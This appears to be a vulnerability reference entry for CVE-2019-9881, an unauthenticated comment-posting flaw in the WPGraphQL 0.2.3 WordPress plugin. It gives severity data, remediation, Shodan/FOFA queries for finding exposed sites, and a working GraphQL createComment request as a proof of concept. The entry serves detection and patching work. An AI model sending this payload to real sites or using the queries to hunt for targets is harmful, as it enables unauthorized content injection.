---
layout: "post"
cve_id: "CVE-2019-9881"
title: "WPEngine WPGraphQL 0.2.3 - Unauthenticated Comment Posting"
pcap: true
pcap_path: "/pcaps/2019/CVE-2019-9881.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-9881.yaml"
author: "intelligent-ears"
severity: "medium"
impact: "An attacker can exploit this vulnerability to post unauthorized comments on WordPress posts, potentially leading to content manipulation and defacement.
"
remediation: "Update WPGraphQL to version 0.3.0 or later to fix this vulnerability.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2019-9881"
  - "https://github.com/wp-graphql/wp-graphql/releases/tag/v0.3.0"
  - "https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/"
  - "https://wpvulndb.com/vulnerabilities/9282"
classification:
  cvss-metrics: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
  cvss-score: 5.3
  cve-id: "CVE-2019-9881"
  cwe-id: "CWE-306"
  epss-score: 0.1924
  epss-percentile: 0.95123
  cpe: "cpe:2.3:a:wpengine:wpgraphql:0.2.3:*:*:*:*:wordpress:*:*"
metadata:
  verified: True
  max-request: 1
  vendor: "wpengine"
  product: "wpgraphql"
  framework: "wordpress"
  shodan-query: "http.title:\"WordPress\" \"graphql\""
  fofa-query: "body=\"/wp-content/plugins/wp-graphql/\""
  publicwww-query: "/wp-content/plugins/wp-graphql/"
tags:
  - "cve"
  - "cve2019"
  - "wp"
  - "wp-plugin"
  - "wordpress"
  - "wp-graphql"
  - "wpengine"
  - "unauth"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
The createComment mutation in the WPGraphQL 0.2.3 plugin for WordPress allows unauthenticated users to post comments on any article, even when 'allow comment' is disabled.


## üåê HTTP Request
```nohighlight
POST /graphql HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.14
Connection: close
Content-Length: 164
Content-Type: application/json
Accept-Encoding: gzip

{"query": "mutation { createComment(input: { postId: 1, userId: 1, content: \"36hg73cal517SDZiIP3cyCay1Jk\", clientMutationId: \"cehyz\" }) { clientMutationId } }"}
```


